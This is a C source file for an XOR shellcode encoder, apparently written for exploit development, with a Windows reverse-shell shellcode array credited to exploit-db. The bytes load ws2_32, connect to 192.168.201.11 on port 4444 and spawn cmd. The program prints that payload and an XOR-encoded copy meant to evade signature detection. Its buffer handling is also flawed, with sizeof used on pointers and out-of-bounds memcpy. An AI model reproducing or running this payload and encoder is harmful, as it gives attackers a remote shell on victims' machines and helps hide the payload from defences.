#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define XORVAL 0x3a // the value that will be used to xor with every byte

/* https://www.exploit-db.com/shellcodes/50291 */
unsigned char shellcode[] = \      
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x96\xad\x8b"
"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31"
"\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f"
"\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde"
"\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53"
"\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54"
"\x53\x89\xde\xff\xd2\x83\xc4\x0c\x5a\x50\x52\x66\xba\x6c\x6c\x52\x68\x33"
"\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x04"
"\x68\x75\x70\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x74\x61\x72\x74\x68"
"\x57\x53\x41\x53\x54\x50\x89\xc7\xff\xd2\x31\xdb\x66\xbb\x90\x01\x29\xdc"
"\x54\x53\xff\xd0\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b\xdb\x64\x8b\x14\x1c"
"\x68\x74\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x6f\x63\x6b\x65\x68"
"\x57\x53\x41\x53\x54\x89\xf8\x50\xff\xd2\x57\x31\xc9\x52\x52\x52\xb2\x06"
"\x52\x41\x51\x41\x51\xff\xd0\x91\x5f\x83\xc4\x10\x31\xdb\x80\xc3\x04\x6b"
"\xdb\x63\x8b\x14\x1c\x68\x65\x63\x74\x61\x66\x83\x6c\x24\x03\x61\x68\x63"
"\x6f\x6e\x6e\x54\x57\x87\xcd\xff\xd2\x68\xc0\xa8\xc9\x0b\x66\x68\x11\x5c"
"\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x55\x87\xef\xff\xd0\x83"
"\xc4\x14\x31\xdb\x80\xc3\x04\x6b\xdb\x62\x8b\x14\x1c\x68\x73\x41\x61\x61"
"\x81\x6c\x24\x02\x61\x61\x00\x00\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72"
"\x68\x43\x72\x65\x61\x54\x89\xf5\x55\xff\xd2\x50\x8d\x28\x68\x63\x6d\x64"
"\x61\x66\x83\x6c\x24\x03\x61\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x57\x57"
"\x57\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52"
"\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50"
"\x52\x52\x51\x52\xff\xd5";

void main(int argc, char * argv[])
{

printf("\033[01;33m");
printf( R"EOF(
                         _\|/_
                         (o o)
           +----------oOO-{_}-OOo----------+
                    			             
                        SeX0Rme				 	
                  -=---------------=-

                   Simple XOR Encoder       
                    Author: @xen0vas    
                                         
)EOF");
printf("\033[0m");

	printf("\033[01;33m");
	printf("\n");
	printf("\n[*] Original Shellcode:");
	printf("\n\n\n");
	printf("\033[0m");

	unsigned char *shellcode1=(char*)malloc(sizeof(shellcode)*2);
	memset( shellcode1, 0, sizeof(shellcode1)*2);

	unsigned char *shellcode2=(char*)malloc(sizeof(shellcode)*2);
	memset( shellcode2, 0, sizeof(shellcode2)*2);

	unsigned char *shellcode3=(char*)malloc(sizeof(shellcode)*2);
	memset( shellcode3, 0, sizeof(shellcode3)*2);

	for (int o=0; o<sizeof(shellcode)-1; o++) {
		printf("\033[0;36m");
                printf("\\x%02x", shellcode[o]);
                printf("\033[0m");
        }
	printf("\033[0;32m");
	printf("\n\n----------------------\n\n");
	printf("\033[0m");

	for (int o=0; o<sizeof(shellcode)-1; o++) {
		printf("\033[0;36m");
                printf("0x%02x,", shellcode[o]);
                printf("\033[0m");
        }

	printf("\033[0;32m");
	printf("\n\n----------------------\n\n");
	printf("\033[0m");


	for (int o=0; o<sizeof(shellcode)-1; o++) {
		printf("\033[0;36m");
                printf("%02x", shellcode[o]);
                printf("\033[0m");
        }

        printf("\033[0;32m");
	printf("\n\n**********************");
	printf("**********************");
	printf("\033[0m");


        printf("\033[01;33m");
	printf("\n\n[*] Original Shellcode Length : %d\n",sizeof(shellcode)-1);
	printf("\033[0m");

	for (int i=0; i<(sizeof(shellcode)*2); i++) {
	        memcpy(&shellcode1[i],(unsigned char*)&shellcode[i], sizeof(shellcode[i])*2);
                memcpy(&shellcode2[i],(unsigned char*)&shellcode[i], sizeof(shellcode[i])*2);
	        memcpy(&shellcode3[i],(unsigned char*)&shellcode[i], sizeof(shellcode[i])*2);
	}

	printf("\033[0;32m");
	printf("\n\n**********************");
	printf("**********************");
	printf("\033[0m");

        printf("\033[01;33m");
	printf("\n\n[*] Encoded Shellcode:\n\n");
	printf("\033[0m");

	for (int i=0; i<sizeof(shellcode)-1; i++) {
		shellcode2[i] = shellcode2[i] ^ XORVAL; 
		printf("\033[01;34m");
        	printf("\\x%02x", shellcode2[i]);
        	printf("\033[0m");
	}

	printf("\n\n");
	printf("\033[0;32m");
	printf("----------------------\n\n");
	printf("\033[0m");

 	for (int i=0; i<sizeof(shellcode)-1; i++) {
		shellcode1[i] = shellcode1[i] ^ XORVAL; 
		printf("\033[01;34m");
		printf("0x%02x,", shellcode1[i]);
		printf("\033[0m");
	}

        printf("\n\n");
        printf("\033[0;32m");
        printf("----------------------\n\n");
        printf("\033[0m");

        for (int i=0; i<sizeof(shellcode)-1; i++) {
                shellcode3[i] = shellcode3[i] ^ XORVAL; 
                printf("\033[01;34m");
                printf("%02x", shellcode3[i]);
                printf("\033[0m");
        }

	printf("\n\n");
	free(shellcode1);
	free(shellcode2);
	free(shellcode3); 
}

/* @xen0vas */

